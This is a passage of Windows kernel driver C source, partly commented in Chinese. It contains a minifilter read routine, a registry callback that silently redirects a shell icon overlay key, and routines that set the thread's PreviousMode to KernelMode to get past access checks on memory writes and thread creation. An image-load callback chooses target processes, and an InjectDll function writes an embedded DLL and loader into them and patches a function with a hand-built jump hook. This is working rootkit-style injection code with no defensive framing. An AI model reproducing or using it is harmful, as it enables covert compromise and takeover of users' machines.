    IN OUT PFLT_CALLBACK_DATA Data,
    IN PCFLT_RELATED_OBJECTS FltObjects,
    OUT PVOID *CompletionContext
)
/*++

Routine Description:

    This routine demonstrates how to swap buffers for the READ operation.

    Note that it handles all errors by simply not doing the buffer swap.

Arguments:

    Data - Pointer to the filter callbackData that is passed to us.

    FltObjects - Pointer to the FLT_RELATED_OBJECTS data structure containing
        opaque handles to this filter, instance, its associated volume and
        file object.

    CompletionContext - Receives the context that will be passed to the
        post-operation callback.

Return Value:

    FLT_PREOP_SUCCESS_WITH_CALLBACK - we want a postOpeation callback
    FLT_PREOP_SUCCESS_NO_CALLBACK - we don't want a postOperation callback

--*/
{
    PFLT_IO_PARAMETER_BLOCK iopb = Data->Iopb;
    FLT_PREOP_CALLBACK_STATUS retValue = FLT_PREOP_SUCCESS_NO_CALLBACK;
    PVOID newBuf = NULL;
    PMDL newMdl = NULL;
    PVOLUME_CONTEXT volCtx = NULL;
    PSTREAM_CONTEXT pStreamCtx = NULL;
    PPRE_2_POST_CONTEXT p2pCtx=NULL;
    NTSTATUS status;
    ULONG readLen = iopb->Parameters.Read.Length;
    PFLT_FILE_NAME_INFORMATION nameInfo;
    WCHAR filename[216]= {0};
    ULONG  uRet=0;
    try {

        //get volume context
        status = FltGetVolumeContext(FltObjects->Filter, FltObjects->Volume, &volCtx);
        if (!NT_SUCCESS(status)) __leave;
        //get per-stream context, not used presently
        status = Ctx_FindOrCreateStreamContext(Data, FltObjects, FALSE, &pStreamCtx, NULL);
        if (!NT_SUCCESS(status)) __leave;
        //fast io path, disallow it, this will lead to an equivalent irp request coming in
        if (FLT_IS_FASTIO_OPERATION(Data)) { // disallow fast io path
            DbgPrint("[PreRead] FLT_PREOP_DISALLOW_FASTIO");
            retValue = FLT_PREOP_DISALLOW_FASTIO;
            __leave;
        }

        //cached io irp path
        if (!(Data->Iopb->IrpFlags & (IRP_NOCACHE | IRP_PAGING_IO | IRP_SYNCHRONOUS_PAGING_IO))) {
            DbgPrint("[PreRead] This is Not IRP_NOCACHE IRP_PAGING_IO IRP_SYNCHRONOUS_PAGING_IO:%x",Data->Iopb->IrpFlags);
            __leave;
        }


        // read length is zero, pass
        if (readLen == 0) __leave;


        //
        //  If this is a non-cached I/O we need to round the length up to the
        //  sector size for this device.  We must do this because the file
        //  systems do this and we need to make sure our buffer is as big
        //  as they are expecting.
        //

        if (FlagOn(IRP_NOCACHE,iopb->IrpFlags)) {

            readLen = (ULONG)ROUND_TO_SIZE(readLen,volCtx->SectorSize);
        }

        //
        //  Allocate nonPaged memory for the buffer we are swapping to.
        //  If we fail to get the memory, just don't swap buffers on this
        //  operation.
        //

        newBuf = ExAllocatePoolWithTag( NonPagedPool,readLen,BUFFER_SWAP_TAG );
        if (newBuf == NULL) {
            leave;
        }

        //
        //  We only need to build a MDL for IRP operations.  We don't need to
        //  do this for a FASTIO operation since the FASTIO interface has no
        //  parameter for passing the MDL to the file system.
        //

        if (FlagOn(Data->Flags,FLTFL_CALLBACK_DATA_IRP_OPERATION)) {

            //
            //  Allocate a MDL for the new allocated memory.  If we fail
            //  the MDL allocation then we won't swap buffer for this operation
            //

            newMdl = IoAllocateMdl( newBuf,readLen,TRUE,FALSE,NULL );
            if (newMdl == NULL) {
                leave;
            }

            //
            //  setup the MDL for the non-paged pool we just allocated
            //

            MmBuildMdlForNonPagedPool( newMdl );

        }


        //
        //  We are ready to swap buffers, get a pre2Post context structure.
        //  We need it to pass the volume context and the allocate memory
        //  buffer to the post operation callback.
        //

        p2pCtx = ExAllocateFromNPagedLookasideList( &Pre2PostContextList );

        if (p2pCtx == NULL) {
            kprintf("[PreRead]:%wZ Failed to allocate pre2Post context structure\n",&volCtx->Name);
            leave;
        }
        //
        //  Update the buffer pointers and MDL address, mark we have changed
        //  something.
        //
        DbgPrint("[PreRead] p2pCtx:%p newBuf:%p newMdl:%p",p2pCtx,newBuf,newMdl);
        iopb->Parameters.Read.ReadBuffer = newBuf;
        iopb->Parameters.Read.MdlAddress = newMdl;
        FltSetCallbackDataDirty( Data );
        //
        //  Pass state to our post-operation callback.
        //
        p2pCtx->SwappedBuffer = newBuf;
        p2pCtx->VolCtx = volCtx;
        p2pCtx->pStreamCtx = pStreamCtx;
        *CompletionContext = p2pCtx;

        //
        //  Return we want a post-operation callback
        //

        retValue = FLT_PREOP_SUCCESS_WITH_CALLBACK;

    }
    finally {

        //
        //  If we don't want a post-operation callback, then cleanup state.
        //

        if (retValue != FLT_PREOP_SUCCESS_WITH_CALLBACK)
        {
            if (newBuf != NULL) {
                ExFreePool( newBuf );
            }
            if (newMdl != NULL) {
                IoFreeMdl( newMdl );
            }
            if (volCtx != NULL) {
                FltReleaseContext( volCtx );
            }
            if (NULL != pStreamCtx) {
                FltReleaseContext(pStreamCtx);
            }
        }
    }

    return retValue;
}


FLT_POSTOP_CALLBACK_STATUS PostReadWhenSafe (
    IN OUT PFLT_CALLBACK_DATA Data,
    IN PCFLT_RELATED_OBJECTS FltObjects,
    IN PVOID CompletionContext,
    IN FLT_POST_OPERATION_FLAGS Flags
)
/*++

Routine Description:

    We had an arbitrary users buffer without a MDL so we needed to get
    to a safe IRQL so we could lock it and then copy the data.

Arguments:

    Data - Pointer to the filter callbackData that is passed to us.

    FltObjects - Pointer to the FLT_RELATED_OBJECTS data structure containing
        opaque handles to this filter, instance, its associated volume and
        file object.

    CompletionContext - Contains state from our PreOperation callback

    Flags - Denotes whether the completion is successful or is being drained.

Return Value:

    FLT_POSTOP_FINISHED_PROCESSING - This is always returned.

--*/
{
    PFLT_IO_PARAMETER_BLOCK iopb = Data->Iopb;
    PPRE_2_POST_CONTEXT p2pCtx = CompletionContext;
    PVOID origBuf;
    NTSTATUS status;

    UNREFERENCED_PARAMETER( FltObjects );
    UNREFERENCED_PARAMETER( Flags );
    ASSERT(Data->IoStatus.Information != 0);

    //
    //  This is some sort of user buffer without a MDL, lock the user buffer
    //  so we can access it.  This will create a MDL for it.
    //

    status = FltLockUserBuffer( Data );

    if (!NT_SUCCESS(status)) {

        //
        //  If we can't lock the buffer, fail the operation
        //
        Data->IoStatus.Status = status;
        Data->IoStatus.Information = 0;

    } else {
        origBuf = MmGetSystemAddressForMdlSafe( iopb->Parameters.Read.MdlAddress,NormalPagePriority );
        if (origBuf == NULL) {

            //
            //  If we couldn't get a SYSTEM buffer address, fail the operation
            //
            Data->IoStatus.Status = STATUS_INSUFFICIENT_RESOURCES;
            Data->IoStatus.Information = 0;
        } else {

            //DbgPrint("[PostReadWhenSafe] %s",origBuf);
            //memset( p2pCtx->SwappedBuffer, 0x61, Data->IoStatus.Information);
            //RtlCopyMemory(origBuf, p2pCtx->SwappedBuffer, Data->IoStatus.Information);

        }
    }

    //
    //  Free allocated memory and release the volume context
    //
    ExFreePool( p2pCtx->SwappedBuffer );
    FltReleaseContext( p2pCtx->VolCtx );

    ExFreeToNPagedLookasideList( &Pre2PostContextList,
                                 p2pCtx );

    return FLT_POSTOP_FINISHED_PROCESSING;
}

DWORD_PTR GetSystemRoutineAddress(WCHAR *szFunCtionAName)
{
    UNICODE_STRING FsRtlLegalAnsiCharacterArray_String;
    RtlInitUnicodeString(&FsRtlLegalAnsiCharacterArray_String, szFunCtionAName);
    return (DWORD_PTR)MmGetSystemRoutineAddress(&FsRtlLegalAnsiCharacterArray_String);
}



// 回调函数
NTSTATUS RegisterMonCallback(
    PVOID CallbackContext,
    // 操作类型（只是操作编号，不是指针）
    PVOID Argument1,
    // 操作详细信息的结构体指针
    PVOID Argument2
)
{
    NTSTATUS status = STATUS_SUCCESS;
    UNICODE_STRING ustrRegPath = { 0 };
    // 获取操作类型
    LONG lOperateType = (LONG)Argument1;
    LONG NotifyClass = (LONG)Argument1;
    UNREFERENCED_PARAMETER(CallbackContext);
    // 判断操作
    switch (lOperateType) {
        case RegNtPreCreateKeyEx:
        case RegNtPreOpenKeyEx: {
            PREG_CREATE_KEY_INFORMATION KeyInfo = (PREG_CREATE_KEY_INFORMATION)Argument2;
            WCHAR                       exename[216] = { 0 };
            WCHAR                       PathReg[512] = { 0 };
            if (MmIsAddressValid(KeyInfo) && MmIsAddressValid(KeyInfo->CompleteName)) {
                PUNICODE_STRING  pPath = KeyInfo->CompleteName;
                WCHAR   key[216] = { 0 };
                //DbgPrint("CompleteName:%wZ Length:%d",KeyInfo->CompleteName,KeyInfo->CompleteName->Length);
                if (GetNameByUnicodeString(pPath, key)) {
                    //0OverlayIcon
                    if (_wcsicmp(key, L"adplug") == 0) {

                        WCHAR *pslr = _wcslwr(pPath->Buffer, pPath->Length);
                        if (wcsstr(pslr, L"shelliconoverlayidentifiers\\adplug")) {
                            UNICODE_STRING FullKeyName = { 0 };
                            HANDLE                      KeyHandle;
                            ULONG                       Disposition;
                            OBJECT_ATTRIBUTES           ObjectAttrib;

                            RtlInitUnicodeString(&FullKeyName, L"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\EnhancedStorageShell");
                            InitializeObjectAttributes(&ObjectAttrib, &FullKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);
                            if (NotifyClass == RegNtPreCreateKeyEx) {
                                status = ZwCreateKey(&KeyHandle, KeyInfo->DesiredAccess, &ObjectAttrib, 0, KeyInfo->Class, KeyInfo->CreateOptions, &Disposition);
                            } else {
                                status = ZwOpenKey(&KeyHandle, KeyInfo->DesiredAccess, &ObjectAttrib);
                            }

                            if (NT_SUCCESS(status)) {
                                PVOID KeyObject;
                                status = ObReferenceObjectByHandle(KeyHandle, KeyInfo->DesiredAccess, (POBJECT_TYPE)KeyInfo->ObjectType, KernelMode, &KeyObject, NULL);
                                if (NT_SUCCESS(status)) {
                                    __try {
                                        if (NotifyClass == RegNtPreCreateKeyEx) {
                                            *KeyInfo->Disposition   = Disposition;
                                        }

                                        *KeyInfo->ResultObject = KeyObject;
                                        KeyInfo->GrantedAccess = KeyInfo->DesiredAccess;
                                        status = STATUS_CALLBACK_BYPASS;
                                    } __except(EXCEPTION_EXECUTE_HANDLER) {
                                        ObDereferenceObject(KeyObject);
                                        status =  GetExceptionCode();
                                    }
                                }

                                ZwClose(KeyHandle);
                            }
                        }

                    }

                }
            }
        }
    }
    return status;
}


NTSTATUS SetRegisterCallback()
{
    NTSTATUS status = CmRegisterCallback(RegisterMonCallback, NULL, &g_liRegCookie);

    if (!NT_SUCCESS(status)) {
        DbgPrint("CmRegisterCallback", status);
        g_liRegCookie.QuadPart = 0;
        return status;
    }

    return status;
}

VOID DriverUnload(IN PDRIVER_OBJECT pDriverObj)
{

    UNICODE_STRING strLink = { 0 };
    // Unloading - no resources to free so just return.
    UNREFERENCED_PARAMETER(pDriverObj);

    // TODO: Add uninstall code here.
    PsRemoveLoadImageNotifyRoutine((PLOAD_IMAGE_NOTIFY_ROUTINE)ImageNotify);
    RemoveRegisterCallback();
    DbgPrint("Unloaded Success\r\n");
    return;
}

// 删除回调函数
VOID RemoveRegisterCallback()
{
    if (0 < g_liRegCookie.QuadPart) {
        CmUnRegisterCallback(g_liRegCookie);
    }
}

NTSTATUS BBSearchPattern(IN PUCHAR pattern, IN UCHAR wildcard, IN ULONG_PTR len, IN const VOID* base, IN ULONG_PTR size, OUT PVOID* ppFound)
{
    ULONG_PTR i, j;

    if(ppFound == NULL || pattern == NULL || base == NULL)
        return STATUS_INVALID_PARAMETER;

    for(i = 0; i < size - len; i++) {
        BOOLEAN found = TRUE;

        for(j = 0; j < len; j++) {
            if(pattern[j] != wildcard && pattern[j] != ((PUCHAR)base)[i + j]) {
                found = FALSE;
                break;
            }
        }

        if(found != FALSE) {
            *ppFound = (PUCHAR)base + i;
            return STATUS_SUCCESS;
        }
    }

    return STATUS_NOT_FOUND;
}

NTSTATUS NTAPI NewNtWriteVirtualMemory(IN HANDLE ProcessHandle, IN PVOID BaseAddress, IN PVOID Buffer, IN ULONG BufferLength, OUT PULONG ReturnLength OPTIONAL)
{
    TYPE_ZwWriteVirtualMemory pfnNtWriteVirtualMemory = NtWriteVirtualMemory;
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    PVOID fnExGetPreviousMode = (PVOID)ExGetPreviousMode;
    PVOID pFoundPattern = NULL;
    UCHAR PreviousModePattern[] = "\x00\x00\xC3";
    ULONG PrevMode = 0;

    if(pfnNtWriteVirtualMemory) {
        if(g_mode) {
            PUCHAR pPrevMode = (PUCHAR)PsGetCurrentThread() + g_mode;
            UCHAR prevMode = *pPrevMode;
            *pPrevMode = KernelMode;
            status = pfnNtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer, BufferLength, ReturnLength);
            *pPrevMode = prevMode;
        } else {
            if(NT_SUCCESS(BBSearchPattern(PreviousModePattern, 0xCC, sizeof(PreviousModePattern) - 1, fnExGetPreviousMode, 32, &pFoundPattern))) {
                PUCHAR pPrevMode = (PUCHAR)PsGetCurrentThread() + *(ULONG *)((PUCHAR)pFoundPattern - 2);
                UCHAR prevMode = *pPrevMode;
                *pPrevMode = KernelMode;
                status = pfnNtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer, BufferLength, ReturnLength);
                *pPrevMode = prevMode;
            }
        }
    } else
        status = STATUS_NOT_FOUND;

    return status;
}

NTSTATUS NTAPI NewNtCreateThreadEx(PHANDLE hThread, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID lpStartAddress, PVOID lpParameter,
                                   ULONG Flags, SIZE_T StackZeroBits, SIZE_T SizeOfStackCommit, SIZE_T SizeOfStackReserve, PVOID lpBytesBuffer)
{
    NTSTATUS status = STATUS_SUCCESS;
    TYPE_NtCreateThreadEx pfnNtCreateThreadEx = NtCreateThreadEx;
    PVOID fnExGetPreviousMode = (PVOID)ExGetPreviousMode;
    PVOID pFoundPattern = NULL;
    UCHAR PreviousModePattern[] = "\x00\x00\xC3";
    ULONG PrevMode = 0;

    if(pfnNtCreateThreadEx) {
        if(g_mode) {
            PUCHAR pPrevMode = (PUCHAR)PsGetCurrentThread() + g_mode;
            UCHAR prevMode = *pPrevMode;
            *pPrevMode = KernelMode;
            status = pfnNtCreateThreadEx(hThread, DesiredAccess, ObjectAttributes, ProcessHandle, lpStartAddress, lpParameter, Flags, StackZeroBits, SizeOfStackCommit, SizeOfStackReserve, lpBytesBuffer);
            *pPrevMode = prevMode;
        } else {
            if(NT_SUCCESS(BBSearchPattern(PreviousModePattern, 0xCC, sizeof(PreviousModePattern) - 1, fnExGetPreviousMode, 32, &pFoundPattern))) {
                PUCHAR pPrevMode = (PUCHAR)PsGetCurrentThread() + *(ULONG *)((PUCHAR)pFoundPattern - 2);
                UCHAR prevMode = *pPrevMode;
                *pPrevMode = KernelMode;
                status = pfnNtCreateThreadEx(hThread, DesiredAccess, ObjectAttributes, ProcessHandle, lpStartAddress, lpParameter, Flags, StackZeroBits, SizeOfStackCommit, SizeOfStackReserve, lpBytesBuffer);
                *pPrevMode = prevMode;
            }
        }
    } else
        status = STATUS_NOT_FOUND;

    return status;
}

NTSTATUS NTAPI NewNtProtectVirtualMemory(IN HANDLE ProcessHandle, IN PVOID* BaseAddress, IN SIZE_T* NumberOfBytesToProtect, IN ULONG NewAccessProtection, OUT PULONG OldAccessProtection)
{
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    TYPE_ZwProtectVirtualMemory pfnNtProtectVirtualMemory = NtProtectVirtualMemory;
    PVOID fnExGetPreviousMode = (PVOID)ExGetPreviousMode;
    PVOID pFoundPattern = NULL;
    UCHAR PreviousModePattern[] = "\x00\x00\xC3";
    ULONG PrevMode = 0;

    if(pfnNtProtectVirtualMemory) {
        if(g_mode) {
            PUCHAR pPrevMode = (PUCHAR)PsGetCurrentThread() + g_mode;
            UCHAR prevMode = *pPrevMode;
            *pPrevMode = KernelMode;
            status = pfnNtProtectVirtualMemory(ProcessHandle, BaseAddress, NumberOfBytesToProtect, NewAccessProtection, OldAccessProtection);
            *pPrevMode = prevMode;
        } else {
            if(NT_SUCCESS(BBSearchPattern(PreviousModePattern, 0xCC, sizeof(PreviousModePattern) - 1, fnExGetPreviousMode, 32, &pFoundPattern))) {
                PUCHAR pPrevMode = (PUCHAR)PsGetCurrentThread() + *(ULONG *)((PUCHAR)pFoundPattern - 2);
                UCHAR prevMode = *pPrevMode;
                *pPrevMode = KernelMode;
                status = pfnNtProtectVirtualMemory(ProcessHandle, BaseAddress, NumberOfBytesToProtect, NewAccessProtection, OldAccessProtection);
                *pPrevMode = prevMode;
            }
        }
    } else
        status = STATUS_NOT_FOUND;

    return status;
}



BOOLEAN IsX64Module(IN PVOID pBase)
{
    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS32 pNtHdr32 = NULL;
    PIMAGE_NT_HEADERS64 pNtHdr64 = NULL;
    PIMAGE_EXPORT_DIRECTORY pExport = NULL;
    ULONG expSize = 0;
    ULONG_PTR pAddress = 0;
    ASSERT(pBase != NULL);

    if(pBase == NULL)
        return FALSE;

    /// Not a PE file
    if(pDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    pNtHdr32 = (PIMAGE_NT_HEADERS32)((PUCHAR)pBase + pDosHdr->e_lfanew);
    pNtHdr64 = (PIMAGE_NT_HEADERS64)((PUCHAR)pBase + pDosHdr->e_lfanew);

    // Not a PE file
    if(pNtHdr32->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    // 64 bit image
    if(pNtHdr32->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        return TRUE;
    }

    return FALSE;
}


PVOID GetProcAddress(IN PVOID pBase, IN PCCHAR name_ord)
{
    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS32 pNtHdr32 = NULL;
    PIMAGE_NT_HEADERS64 pNtHdr64 = NULL;
    PIMAGE_EXPORT_DIRECTORY pExport = NULL;
    ULONG expSize = 0;
    ULONG_PTR pAddress = 0;
    PUSHORT pAddressOfOrds=NULL;
    PULONG  pAddressOfNames =NULL;
    PULONG  pAddressOfFuncs =NULL;
    ULONG i=0;
    ASSERT(pBase != NULL);

    if(pBase == NULL)
        return NULL;

    /// Not a PE file
    if(pDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    pNtHdr32 = (PIMAGE_NT_HEADERS32)((PUCHAR)pBase + pDosHdr->e_lfanew);
    pNtHdr64 = (PIMAGE_NT_HEADERS64)((PUCHAR)pBase + pDosHdr->e_lfanew);

    // Not a PE file
    if(pNtHdr32->Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    // 64 bit image
    if(pNtHdr32->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        pExport = (PIMAGE_EXPORT_DIRECTORY)(pNtHdr64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + (ULONG_PTR)pBase);
        expSize = pNtHdr64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    }
    // 32 bit image
    else {
        pExport = (PIMAGE_EXPORT_DIRECTORY)(pNtHdr32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + (ULONG_PTR)pBase);
        expSize = pNtHdr32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    }

    pAddressOfOrds = (PUSHORT)(pExport->AddressOfNameOrdinals + (ULONG_PTR)pBase);
    pAddressOfNames = (PULONG)(pExport->AddressOfNames + (ULONG_PTR)pBase);
    pAddressOfFuncs = (PULONG)(pExport->AddressOfFunctions + (ULONG_PTR)pBase);

    for(i = 0; i < pExport->NumberOfFunctions; ++i) {
        USHORT OrdIndex = 0xFFFF;
        PCHAR  pName = NULL;

        // Find by index
        if((ULONG_PTR)name_ord <= 0xFFFF) {
            OrdIndex = (USHORT)i;
        }
        // Find by name
        else if((ULONG_PTR)name_ord > 0xFFFF && i < pExport->NumberOfNames) {
            pName = (PCHAR)(pAddressOfNames[i] + (ULONG_PTR)pBase);
            //DbgPrint("api:%s\r\n",pName);
            OrdIndex = pAddressOfOrds[i];
        }
        // Weird params
        else
            return NULL;

        if(((ULONG_PTR)name_ord <= 0xFFFF && (USHORT)((ULONG_PTR)name_ord) == OrdIndex + pExport->Base) ||
           ((ULONG_PTR)name_ord > 0xFFFF && strcmp(pName, name_ord) == 0)) {
            pAddress = pAddressOfFuncs[OrdIndex] + (ULONG_PTR)pBase;
            break;
        }
    }

    return (PVOID)pAddress;
}


VOID ImageNotify(PUNICODE_STRING       FullImageName, HANDLE ProcessId, PIMAGE_INFO  ImageInfo)
{

    PEPROCESS  ProcessObj = NULL;
    PPEB       pPEB    = NULL;
    NTSTATUS   st = STATUS_UNSUCCESSFUL;
    NTSTATUS   status;
    UCHAR*     pData = NULL;
    wchar_t*   pfind = NULL;
    WCHAR      pTempBuf[ 512 ] = { 0 };
    WCHAR      exename[216] = {0};
    int i = 0;

	if (ProcessId==0)
		{
				//DbgPrint("ProcessId：%x FullImageName:%wZ  ",ProcessId,FullImageName);
				goto fun_ret;
		}

    if(FullImageName == NULL || MmIsAddressValid(FullImageName) == FALSE || FullImageName->Length > 512) {
        goto fun_ret;
    }

	PsGetProcessWow64Process   = PsGetProcessWow64Process==NULL?(P_PsGetProcessWow64Process)GetSystemRoutineAddress(L"PsGetProcessWow64Process"):PsGetProcessWow64Process;
	PsGetProcessPeb=PsGetProcessPeb==NULL?(P_PsGetProcessPeb)GetSystemRoutineAddress(L"PsGetProcessPeb"):PsGetProcessPeb;
    RtlCopyMemory(pTempBuf, FullImageName->Buffer, FullImageName->Length);
    pfind    = wcsrchr(pTempBuf, L'\\');

    if(pfind == NULL)
        goto fun_ret;
    ++pfind;
    if (_wcsicmp(pfind,L"ntdll.dll")==0) {
		InitGlobeFunc(ImageInfo);
		_wcslwr(pTempBuf);
	ProcessObj=PsGetCurrentProcess();
#ifdef _AMD64_
		 //x64 add code
		pPEB=PsGetProcessWow64Process(ProcessObj);
 		if(wcsstr(pTempBuf,L"\\syswow64\\")!=NULL){
			BOOLEAN  bfind = GetProcessNameByObj(ProcessObj, exename);
				if(bfind == TRUE && IsByInjectProc(exename)) {
						InjectDll(ProcessObj, 32);
			 	}
		}else{
			if(pPEB==NULL){
				pPEB=PsGetProcessPeb(ProcessObj);
				if (GetProcessNameByObj(ProcessObj,exename)&&IsByInjectProc(exename)) {
					InjectDll(ProcessObj,32);
				}	
			}
		}
#else
	//x86 add code
	pPEB=PsGetProcessPeb(ProcessObj);
	if (GetProcessNameByObj(ProcessObj,exename)&&IsByInjectProc(exename)) {
	  	newWorkItem(32);
	}
	
#endif


    }

fun_ret:
    return;
}


ULONGLONG GetKeServiceDescriptorTable64()
{
    char KiSystemServiceStart_pattern[14] = "\x8B\xF8\xC1\xEF\x07\x83\xE7\x20\x25\xFF\x0F\x00\x00"; //
    ULONGLONG CodeScanStart = (ULONGLONG)&_strnicmp;
    ULONGLONG CodeScanEnd = (ULONGLONG)&KdDebuggerNotPresent;
    UNICODE_STRING Symbol;
    ULONGLONG i, tbl_address, b;

    for(i = 0; i < CodeScanEnd - CodeScanStart; i++) {
        if(!memcmp((char*)(ULONGLONG)CodeScanStart + i, (char*)KiSystemServiceStart_pattern, 13)) {
            for(b = 0; b < 50; b++) {
                tbl_address = ((ULONGLONG)CodeScanStart + i + b);

                if(*(USHORT*)((ULONGLONG)tbl_address) == (USHORT)0x8d4c)
                    return ((LONGLONG)tbl_address + 7) + *(LONG*)(tbl_address + 3);
            }
        }
    }

    return 0;
}

ULONG_PTR GetSSDTFuncCurAddr(LONG id)
{
#ifdef _AMD64_
    LONG dwtmp = 0;
    PULONG ServiceTableBase = NULL;

    if(KeServiceDescriptorTable == NULL)
        return NULL;
    if(KeServiceDescriptorTable->NumberOfService < id)
        return NULL;
    ServiceTableBase = (PULONG)KeServiceDescriptorTable->ServiceTableBase;
    dwtmp = ServiceTableBase[id];
    dwtmp = dwtmp >> 4;
    return (LONGLONG)dwtmp + (ULONGLONG)ServiceTableBase;
#else
    ULONG_PTR p =  *(ULONG_PTR*)((ULONG)(KeServiceDescriptorTable.ServiceTableBase) + 4 * id);
    return p;
#endif
}


/** 
 * [InjectDll description]
 * @Author   fanyusen
 * @DateTime 2019年6月7日T7:43:44+0800
 * @param    ProcessObj               [PEPROCESS]
 * @param    ibit                     [32/64]
 */
void InjectDll(PEPROCESS ProcessObj, int ibit)
{
    NTSTATUS status = -1;

    if(NtWriteVirtualMemory && m_pCreateThread && NtProtectVirtualMemory) {
        HANDLE ProcessHandle = (HANDLE) - 1;
        PVOID dllbase = NULL;
        ULONG_PTR  ZeroBits = 0;
        SIZE_T   sizeDll = ibit == 64 ? g_iDll64 : g_iDll32;
        PVOID    pOldDll = ibit == 64 ? g_pDll64 : g_pDll32;
        SIZE_T   sizeMemLoad = ibit == 64 ? sizeof(MemLoad64) : sizeof(MemLoad);     
        PVOID  pOldMemloadBase = ibit == 64 ? (PVOID)MemLoad64 : (PVOID)MemLoad;
        ULONG   uWriteRet = 0;

        PARAMX param= {0};
        PVOID  MemloadBase = NULL;
        SIZE_T   sizeMemloadAll =  sizeMemLoad + sizeof(PARAMX) + 200;
        UCHAR b1[14] = {0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x18, 0xC3};
        PUCHAR pParambase=NULL;
        PUCHAR  pCall=NULL;

        status = ObOpenObjectByPointer(ProcessObj, OBJ_KERNEL_HANDLE, NULL, PROCESS_ALL_ACCESS, NULL, KernelMode, &ProcessHandle);

        if(!NT_SUCCESS(status)) {
            kprintf("[InjectDll] ObOpenObjectByPointer status:%x", status);
            return;
        }


        status = ZwAllocateVirtualMemory(ProcessHandle, &dllbase, ZeroBits, &sizeDll, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        if(!NT_SUCCESS(status)) {
            kprintf("[InjectDll] status:%x", status);
            goto HHHH;
        }

//        kprintf("[InjectDll] dllbase:%p", dllbase);

        RtlZeroMemory(&param, sizeof(PARAMX));

        status = ZwAllocateVirtualMemory(ProcessHandle, &MemloadBase, ZeroBits, &sizeMemloadAll, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        if(!NT_SUCCESS(status)) {
            kprintf("[InjectDll] status:%x", status);
            goto HHHH;
        }

//        kprintf("[InjectDll] MemloadBase:%p", MemloadBase);
        //写入dll
        status = NewNtWriteVirtualMemory(ProcessHandle, dllbase, pOldDll, sizeDll, &uWriteRet);

        if(!NT_SUCCESS(status)) {
            kprintf("[InjectDll] NewNtWriteVirtualMemory fail: status:%x write addr:%p size:%x", status,dllbase,sizeDll);
            goto HHHH;
        }

        param.lpFileData = (ULONG64)dllbase ;
        param.DataLength = (ULONG64)sizeDll;
        memcpy(param.pFunction, b1, sizeof(b1));
        //写入memload
        status = NewNtWriteVirtualMemory(ProcessHandle, MemloadBase, pOldMemloadBase, sizeMemLoad, &uWriteRet);

        if(!NT_SUCCESS(status)) {
            kprintf("[InjectDll] NewNtWriteVirtualMemory fail: status:%x write addr:%p size:%x", status,MemloadBase,sizeMemLoad);
            goto HHHH;
        }


        pParambase = (PUCHAR)MemloadBase + sizeMemLoad;
        pCall = (PUCHAR)MemloadBase + sizeof(PARAMX) + sizeMemLoad;
//        kprintf("[InjectDll] MemloadBase:%p pParambase:%p ", MemloadBase, pParambase);
        //写入memload param
        status = NewNtWriteVirtualMemory(ProcessHandle, pParambase, &param, sizeof(PARAMX), &uWriteRet);

        if(!NT_SUCCESS(status)) {
            goto HHHH;
        }

        if(NtCreateThreadEx == NULL) {
            PVOID pBase = fnHookfunc;
            SIZE_T   numbsize = 5;
            ULONG    oldProctect;
            status =  NewNtProtectVirtualMemory(ProcessHandle, &pBase, &numbsize, PAGE_EXECUTE_READWRITE, &oldProctect);
            if(NT_SUCCESS(status)) {
                UCHAR b2[5] = {0};
                int u1=0;
                int u2=0;
                unsigned char pAddr[51] = {
                    0xB8, 0x00, 0x00, 0x01, 0x00, 0xC6, 0x00, 0xFF, 0xC6, 0x40, 0x01, 0xFF, 0xC6, 0x40, 0x02, 0xFF,
                    0xC6, 0x40, 0x03, 0xFF, 0xC6, 0x40, 0x04, 0xFF, 0x60, 0x9C, 0xB8, 0x00, 0x00, 0x03, 0x00, 0x50,
                    0xB8, 0x00, 0x00, 0x04, 0x00, 0xFF, 0xD0, 0x61, 0x9d, 0xB8, 0x00, 0x00, 0x01, 0x00, 0xe9, 0x00, 0x00, 0x00, 0x00
                };

                unsigned char jumpcode[5] = {0xe9, 0x00, 0x00, 0x00, 0x00};

                RtlMoveMemory(b2, fnHookfunc, 5);
                kprintf("[InjectDll] call NtProtectVirtualMemory success");

                RtlMoveMemory(pAddr + 0x29, fnHookfunc, 5);
                *(PULONG)&pAddr[1] = (ULONG)fnHookfunc;
                pAddr[0x7]  =  b2[0];
                pAddr[0xb]  =  b2[1];
                pAddr[0xf]  =  b2[2];
                pAddr[0x13] =  b2[3];
                pAddr[0x17] =  b2[4];
                *(PULONG)&pAddr[0x1B] = (ULONG)pParambase;
                *(PULONG)&pAddr[0x21] = (ULONG)MemloadBase;
                u1 = ((int)fnHookfunc + 5) - (int)(pCall + 0x2E) - 5;
                *(PULONG)&pAddr[0x2F] = (ULONG)u1;
                RtlCopyMemory(pCall, pAddr, sizeof(pAddr));
                kprintf("[InjectDll] pCall:%p", pCall);

                u2 = (int)pCall - (int)fnHookfunc - 5;
                *(PULONG)&jumpcode[1] = (ULONG)u2;
                RtlCopyMemory(fnHookfunc, jumpcode, sizeof(jumpcode));
